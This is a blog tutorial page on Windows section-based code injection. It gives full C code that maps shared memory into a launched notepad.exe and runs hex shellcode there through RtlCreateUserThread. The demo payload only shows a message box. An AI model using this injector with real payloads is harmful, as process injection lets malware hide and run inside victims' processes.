@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="turbo-cache-control" content="no-cache">
+
+    <!-- Primary Meta Tags -->
+    <title>Section Code Injection</title>
+    <meta name="title" content="Section Code Injection">
+    <meta name="description" content="Written by 11philip22" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://phasetw0.com/section-code-injection/">
+    <meta property="og:title" content="Section Code Injection">
+    <meta property="og:description" content="Written by 11philip22">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://phasetw0.com/section-code-injection/">
+    <meta property="twitter:title" content="Section Code Injection">
+    <meta property="twitter:description" content="Written by 11philip22">
+    
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="/resources/css/retype.css" rel="stylesheet" />
+
+    <script type="text/javascript" src="/resources/js/config.js" defer></script>
+    <script type="text/javascript" src="/resources/js/retype.js" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js" defer></script>
+</head>
+    <body>
+        <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+    <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+
+    <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+    <div class="container relative flex items-center justify-between flex-grow pr-6 md:justify-start">
+        <!-- Mobile menu button skeleton -->
+        <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center flex-shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px flex-shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+        <div v-cloak id="docs-sidebar-toggle"></div>
+
+        <!-- Logo -->
+        <div class="flex items-center justify-between h-full py-2 md:w-75">
+            <div class="flex items-center px-2 md:px-6">
+                <a id="docs-site-logo" href="/" class="flex items-center leading-snug text-2xl">
+                    <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">phasetw0</span>
+                </a>
+            </div>
+
+            <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+        </div>
+
+        <div class="flex justify-between md:flex-grow">
+            <!-- Top Nav -->
+            <nav class="hidden md:flex">
+    <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+    </ul>
+</nav>
+
+            <!-- Header Right Skeleton -->
+            <div v-cloak class="flex justify-end flex-grow skeleton">
+
+                <!-- Search input mock -->
+                <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                    <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                    </div>
+
+                    <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                    style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search docs" />
+                </div>
+
+                <!-- Mobile search button mock -->
+                <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="flex-shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                </div>
+
+                <!-- Dark mode switch placehokder -->
+                <div class="w-10 h-10 lg:ml-2"></div>
+
+                <!-- History button mock -->
+                <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="flex-shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                </div>
+            </div>
+
+            <div v-cloak class="flex items-center justify-end flex-grow">
+                <div id="docs-mobile-search-button"></div>
+                <doc-search-desktop></doc-search-desktop>
+
+                <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                <doc-history></doc-history>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+    <div class="container relative flex bg-white">
+        <!-- Sidebar Skeleton -->
+<div v-cloak class="fixed flex flex-col flex-shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+
+    <!-- Render this div, if config.showSidebarFilter is `true` -->
+    <div class="flex items-center h-16 px-6">
+        <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+    </div>
+
+    <div class="pl-6 mb-4 mt-1">
+        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+    </div>
+
+    <div class="flex-shrink-0 mt-auto bg-transparent dark:border-dark-650">
+        <a
+    class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in"
+    target="_blank"
+    href="https://retype.com/"
+    rel="noopener"
+>
+    <span class="text-xs whitespace-nowrap">Powered by</span>
+    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+</a>
+
+    </div>
+</div>
+
+<!-- Sidebar component -->
+<doc-sidebar v-cloak>
+    <template #sidebar-footer>
+        <div
+            class="flex-shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650"
+        >
+
+            <a
+    class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in"
+    target="_blank"
+    href="https://retype.com/"
+    rel="noopener"
+>
+    <span class="text-xs whitespace-nowrap">Powered by</span>
+    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+</a>
+
+        </div>
+    </template>
+</doc-sidebar>
+
+
+        <div class="flex-grow min-w-0 dark:bg-dark-850">
+            <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+            <div class="flex">
+    <div class="flex-grow min-w-0 px-6 md:px-16">
+        <main class="relative pt-6 pb-16">
+            <div class="docs-markdown" id="docs-content">
+                <!-- Rendered if sidebar right is enabled -->
+                <div id="docs-sidebar-right-toggle"></div>
+               
+                <!-- Page content  -->
+<doc-anchor-target id="section-code-injection" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#section-code-injection">#</doc-anchor-trigger>
+        <span>Section Code Injection</span>
+    </h1>
+</doc-anchor-target>
+<p>Written by 11philip22</p>
+<doc-anchor-target id="introduction">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
+        <span>Introduction</span>
+    </h2>
+</doc-anchor-target>
+<p>A section object represents a section of memory that can be shared. A process can use a section object to share parts of its memory address space with other processes. Each memory section has one or more corresponding views. A view of a section is a part of the section that is actually visible to a process. The act of creating a view for a section is known as mapping a view of the section.</p>
+<p>In this post we will be using the following NTAPI functions.<br />
+Documentation for these functions can be found at <a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a></p>
+<ul>
+<li>NtCreateSection</li>
+<li>NtMapViewOfSection</li>
+<li>RtlCreateUserThread</li>
+</ul>
+<doc-anchor-target id="overview">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#overview">#</doc-anchor-trigger>
+        <span>Overview</span>
+    </h2>
+</doc-anchor-target>
+<ol>
+<li>Create a section with RWX protection.</li>
+<li>Map a view of the section to the local process with RW protection.</li>
+<li>Map a view of the section to the remote target process with RX protection.</li>
+<li>Put our shellcode in the view mapped in the local process. This will get reflected in the remote process.</li>
+<li>Call a remote thread in the target process on the mapped view that contains our shellcode.</li>
+</ol>
+<doc-anchor-target id="implementation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#implementation">#</doc-anchor-trigger>
+        <span>Implementation</span>
+    </h2>
+</doc-anchor-target>
+<p>In this PoC we will be using x86_64 MessageboxW shellcode. <a href="https://github.com/11philip22/MessageBoxShellcode">https://github.com/11philip22/MessageBoxShellcode</a></p>
+<doc-anchor-target id="step-by-step">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-by-step">#</doc-anchor-trigger>
+        <span>Step by step</span>
+    </h3>
+</doc-anchor-target>
+<p>First we have to define function signatures for <code v-pre>ntdll.dll</code> functions.<br />
+This is necessary since these functions are not defined in a header and each call to <code v-pre>GetProcAddress</code> needs to be cast to a function poiner. Also, with Intellisense, calling the function has the look and feel of calling a normal Win32 function in Visual Studio.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
+typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);</code></pre>
+</doc-codeblock></div>
+<p>Second we have to load these functions from <code v-pre>ntdll.dll</code> using <code v-pre>GetProcAddress</code> and <code v-pre>LoadLibraryW</code>.<br />
+1337 h4x0rs can use <code v-pre>LdrGetProcAddress</code> and <code v-pre>LdrLoadDll</code>. More info on <code v-pre>LdrGetProcAddress</code> and <code v-pre>LdrLoadDll</code> can be found at <a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a>. And here is an example of its implementation: <a href="http://phasetw0.com/writing-optimized-windows-shellcode-in-c/">http://phasetw0.com/writing-optimized-windows-shellcode-in-c/</a></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">NTCREATESECTION	pNtCreateSection;
+NTMAPVIEWOFSECTION pNtMapViewOfSection;
+RTLCREATEUSERTHREAD pRtlCreateUserThread;
+
+CONST HMODULE hNtdll = LoadLibraryW(L&quot;ntdll.dll&quot;);
+if (hNtdll) {
+	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
+	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
+	pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, &quot;RtlCreateUserThread&quot;);
+	FreeLibrary(hNtdll);
+}
+else {
+	return STATUS_OPEN_FAILED;
+}</code></pre>
+</doc-codeblock></div>
+<p>Now we create our section. We create it using RWX permissions.<br />
+Please note that this PoC is returning <code v-pre>NTSTATUS</code> values and not <code v-pre>System Error Codes</code> to convert <code v-pre>NTSTATUS</code> values on could use the <code v-pre>RtlNtStatusToDosError</code> function.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
+
+NTSTATUS ntStatus;
+HANDLE hSection = NULL;
+
+ntStatus = pNtCreateSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
+	(PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+if (!NT_SUCCESS(ntStatus)) {
+	return ntStatus;
+}</code></pre>
+</doc-codeblock></div>
+<p>Then we can proceed to map the section to out local process with RW permissions.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
+PVOID pLocalSectionAddress = NULL;
+
+ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &amp;pLocalSectionAddress, 0, 0, NULL, &amp;dwReqBufSize, 2, 0, PAGE_READWRITE);
+if (!NT_SUCCESS(ntStatus)) {
+	return ntStatus;</code></pre>
+</doc-codeblock></div>
+<p>For our target process we are gonna open <code v-pre>notepad.exe</code> and get its handle.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">NTSTATUS ntStatus;
+STARTUPINFOA startupInfo;
+DWORD dwPid;
+HANDLE hProcess;
+
+ZeroMemory(&amp;startupInfo, sizeof startupInfo);
+startupInfo.cb = sizeof startupInfo;
+ZeroMemory(&amp;processInformation, sizeof processInformation);
+
+if (!CreateProcessA(NULL, &quot;\&quot;notepad.exe\&quot;&quot;, NULL, NULL, FALSE,
+	DETACHED_PROCESS, NULL, NULL, &amp;startupInfo, &amp;processInformation)) {
+	return STATUS_OPEN_FAILED;
+}
+
+dwPid = processInformation.dwProcessId;
+hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)</code></pre>
+</doc-codeblock></div>
+<p>Now we can also map the section to our target process with RX permissions.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
+PVOID pRemoteSectionAddress = NULL;
+
+ntStatus = pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteSectionAddress, 0, 0, NULL, &amp;dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);</code></pre>
+</doc-codeblock></div>
+<p>Copy shellcode to the local view, which will get reflected in the target process&#x27;s mapped view.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);</code></pre>
+</doc-codeblock></div>
+<p>Finally we call a thread on the mapped view containing our shellcode in the remote process.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">HANDLE hThread = NULL;
+
+pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteSectionAddress, NULL, &amp;hThread, NULL);</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="full-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#full-code">#</doc-anchor-trigger>
+        <span>Full code</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;Windows.h&gt;
+
+//
+// Definitions
+//
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
+#define STATUS_OPEN_FAILED  0xC0000136
+#define STATUS_SUCCESS      0x00000000
+
+typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
+typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
+
+//
+// Define function signatures for ntdll functions
+//
+typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
+typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
+
+INT main() {
+	NTSTATUS ntStatus;
+	STARTUPINFOA startupInfo;
+	PROCESS_INFORMATION processInformation;
+	BYTE bMessageboxShellcode64[] = &quot;\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3&quot;;
+	SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
+	LONG lRetVal = STATUS_SUCCESS;
+	DWORD dwPid;
+	LARGE_INTEGER sectionSize = { dwReqBufSize };
+	HANDLE hSection = NULL;
+	HANDLE hProcess;
+	HANDLE hThread = NULL;
+	PVOID pLocalSectionAddress = NULL;
+	PVOID pRemoteSectionAddress = NULL;
+
+	// Function pointers
+	NTCREATESECTION	pNtCreateSection;
+	NTMAPVIEWOFSECTION pNtMapViewOfSection;
+	RTLCREATEUSERTHREAD pRtlCreateUserThread;
+
+	//
+	// Load required functions from ntdll
+	//
+	CONST HMODULE hNtdll = LoadLibraryW(L&quot;ntdll.dll&quot;);
+	if (hNtdll) {
+		pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
+		pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
+		pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, &quot;RtlCreateUserThread&quot;);
+		FreeLibrary(hNtdll);
+	}
+	else {
+		return STATUS_OPEN_FAILED;
+	}
+
+	//
+	// Create a section
+	//
+	ntStatus = pNtCreateSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
+		(PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+	if (!NT_SUCCESS(ntStatus)) {
+		return ntStatus;
+	}
+
+	//
+	// Map section to local process
+	//
+	ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &amp;pLocalSectionAddress, 0, 0, NULL, &amp;dwReqBufSize, 2, 0, PAGE_READWRITE);
+	if (!NT_SUCCESS(ntStatus)) {
+		return ntStatus;
+	}
+
+	//
+	// Create host process
+	//
+	ZeroMemory(&amp;startupInfo, sizeof startupInfo);
+	startupInfo.cb = sizeof startupInfo;
+	ZeroMemory(&amp;processInformation, sizeof processInformation);
+
+	if (!CreateProcessA(NULL, &quot;\&quot;notepad.exe\&quot;&quot;, NULL, NULL, FALSE,
+		DETACHED_PROCESS, NULL, NULL, &amp;startupInfo, &amp;processInformation)) {
+		return STATUS_OPEN_FAILED;
+	}
+
+	dwPid = processInformation.dwProcessId;
+	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
+		lRetVal = STATUS_OPEN_FAILED;
+		goto lblCleanup;
+	}
+
+	//
+	// Map section to target process
+	//
+	ntStatus = pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteSectionAddress, 0, 0, NULL, &amp;dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
+	if (!NT_SUCCESS(ntStatus)) {
+		lRetVal = ntStatus;
+		goto lblCleanup;
+	}
+	
+	//
+	// copy shellcode to the local view, which will get reflected in the target process's mapped view
+	//
+	memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);
+
+	//
+	// Call thread on section in remote process
+	//
+	ntStatus = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteSectionAddress, NULL, &amp;hThread, NULL);
+	if (!NT_SUCCESS(ntStatus)) {
+		lRetVal = ntStatus;
+	}
+	
+lblCleanup:
+	if (processInformation.hProcess) {
+		CloseHandle(processInformation.hProcess);
+	}
+
+	if (processInformation.hThread) {
+		CloseHandle(processInformation.hThread);
+	}
+	
+	return lRetVal;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="references">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#references">#</doc-anchor-trigger>
+        <span>References</span>
+    </h2>
+</doc-anchor-target>
+<ul>
